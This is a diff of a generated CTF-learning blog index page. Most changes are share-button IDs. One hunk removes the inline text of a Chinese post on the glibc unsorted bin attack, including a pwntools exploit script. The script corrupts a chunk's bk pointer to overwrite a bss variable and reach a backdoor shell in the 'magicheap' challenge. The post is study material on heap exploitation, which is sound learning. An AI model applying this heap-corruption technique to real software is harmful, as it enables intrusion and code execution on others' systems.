@@ -79,28 +79,18 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/10/09/unsortedbin-attack/" data-id="ckujyvzhl0002wcvk7qu3caff" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/10/09/unsortedbin-attack/" data-id="ckujyxfl20004ksvk58284doh" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>依旧是ctfwiki pwn系列，上次的fastbin attck的第二题先摆了，逆向水平不够，但是主要的手法和思想已经学到了，今天学了unsorted bin attack</p>
-<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>chunk进入unsortedbin的几种情况：</p>
-<p>1.最主要的来源，就是当用户free一个不属于fastbin的chunk时，会优先进入unsorted bin</p>
-<p>2.当一个较大的chunk被分成两半时，如果剩下的部分大于MINSIZE，就会被放到unsorted bin</p>
-<p>3.当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</p>
-<h2 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h2><p><img src="/2021/10/09/unsortedbin-attack/1.png" alt="1"></p>
-<p>unsorted bin是一个双链表结构，其中会有一个chunk的fd指向main_arena，如果能泄露出他的fd指针，我们就可以知道main_arena，而malloc_hook，libc_base等都与main_arena固定偏移。</p>
-<h3 id="实现leak的方法"><a href="#实现leak的方法" class="headerlink" title="实现leak的方法"></a>实现leak的方法</h3><p>大多数是通过uaf，double free等将已经放入unsorted bin中的chunk通过程序本身自带的“show”功能，打印出fd</p>
-<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><p><img src="/2021/10/09/unsortedbin-attack/2.png" alt="2"></p>
-<p>第一眼竟然没看明白，其实就是把unsorted bin拿出来的时候，会把这个unsorted bin写进fd这个指针所指向的位置</p>
-<p>所以unsortedbin的意义简单来讲，就是把一个很大的值写到一个指定地址</p>
-<p>然后例题的话我也懒得细讲了，这题懂了原理的话看ctfwiki就很好理解了吧，直接放下wp</p>
-<p>用我们今天学的unsorted bin attack改一下在bss段magic的值让他变得很大就可以调用后门函数getshell了</p>
-<p>from pwn import *<br>p = process(“./magicheap”)<br>elf = ELF(“./magicheap”)<br>def creat(size,content):<br>    p.recvuntil(“:”)<br>    p.sendline(“1”)<br>    p.recvuntil(“Size of Heap : “)<br>    p.sendline(str(size))<br>    p.recvuntil(“Content of heap:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(“:”)<br>    p.sendline(“3”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>def edit_heap(index,size,content):<br>    p.recvuntil(“:”)<br>    p.sendline(“2”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>    p.recvuntil(“Size of Heap : “)<br>    p.sendline(str(size))<br>    p.recvuntil(“Content of heap : “)<br>    p.sendline(content)</p>
-<p>creat(0x20,b’aaaa’)<br>creat(0x80,b’bbbb’)<br>creat(0x20,b’cccc’)<br>#gdb.attach(p)<br>delete(1)<br>magic = 0x6020C0<br>fd = 0<br>bk = magic - 0x10<br>edit_heap(0,0x40,b’a’*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))<br>creat(0x80,b’aaaa’)<br>p.recvuntil(‘:’)<br>p.sendline(‘4869’)<br>p.interactive()</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2021/10/09/unsortedbin-attack/#more" class="more-link">More <span class="meta-nav">→</span></a>
+          </p>
+        
       
     </div><!-- .entry-content -->
 
@@ -136,7 +126,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/10/03/fastbin-attack/" data-id="ckujyvzhl0003wcvk9ht4a0ac" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/10/03/fastbin-attack/" data-id="ckujyxfl20003ksvk9hoa6s6f" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -183,7 +173,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="ckujyvzhf0000wcvk4xvfgsrt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="ckujyxfkv0000ksvkf98mft25" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -235,7 +225,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/" data-id="ckujyvzhm0004wcvk6up0d99n" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/" data-id="ckujyxfl10002ksvk5ohacwtu" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -282,7 +272,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/07/09/hello-world/" data-id="ckujyvzhj0001wcvk3blkby13" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/07/09/hello-world/" data-id="ckujyxfkz0001ksvkbk8h7zgp" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
